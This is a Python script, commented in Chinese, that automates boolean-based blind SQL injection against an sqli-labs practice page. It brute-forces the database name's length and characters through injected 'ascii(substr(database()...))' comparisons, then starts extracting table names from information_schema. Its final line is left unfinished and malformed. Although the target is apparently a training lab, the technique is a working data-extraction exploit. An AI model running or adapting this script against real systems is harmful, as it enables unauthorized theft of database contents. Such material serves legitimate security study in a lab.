import requests

#页面url
pageURL = "http://192.168.96.135/sqli-labs/Less-5/index.php"

#构造注入语句爆破数据库长度
dbLen = int(1)
dbLenUrl = pageURL + "?id=1' and length(database())>"
# 死循环爆破长度
while(1):
    url = dbLenUrl + str(dbLen) + '%23'
    print(url)
    dbLenGet = requests.get(url)
    dbLenStr = dbLenGet.text
    if(dbLenStr.count("You are in")):
        dbLen += 1
        print(dbLen)
    else:
        break
print('库名长度:'+str(dbLen))
#查数据库名
dbName = ""  #保存库名
guessAscii = 0  #猜测的ASCII值
substart = 0    #截取字符串的起始位置
for i in range(dbLen):
    # 构造注入语句爆破库名
    substart += 1
    dbNameUrl = pageURL + "?id=1' and ascii(substr(database(),"+str(substart)+",1))="
    
    while(1):
        dbNameGet = requests.get(dbNameUrl + str(guessAscii) + "%23")
        dbNameStr = dbNameGet.text
        if(dbNameStr.count("You are in")):
            dbName += str(chr(guessAscii))      #chr()函数可以将ascii值转换成字符   ord()可以把字符转换成对应的ascii值   from:https://www.runoob.com/python3/python3-ascii-character.html
            guessAscii = 0                      #每一位库名爆破成功后将猜测的数字初始化,否则下一位会从当前值继续自增,陷入死循环!
            break
        guessAscii += 1
    print(dbName)

print('库名长度:'+str(dbLen))
print('库名:'+dbName)

#查表名
#构造表名SQL
tbNameSql = "select group_concat(table_name) from information_schema.tables where table_schema ='" + dbName + "'"
# 定义表名长度
tbLen = int(1)

#返回表名长度


#死循环爆破表名长度
while(1):
    tbLenUrl = pageURL + "?id=1' and length(("+tbNameSql+"))>"+ str(tbLen) + "%23"
    print(tbLenUrl)
    tbLenGet = requests.get(tbLenUrl)
    tbLenSTR = tbLenGet.text
    if(tbLenSTR.count("You are in")):
        tbLen += 1
    else:
        break
print("表名长度:"+str(tbLen))







# 构造注入url
tbNameUrl = pageURL + "?id=1' and ascii(substr("+tbNameSql+",,1))"

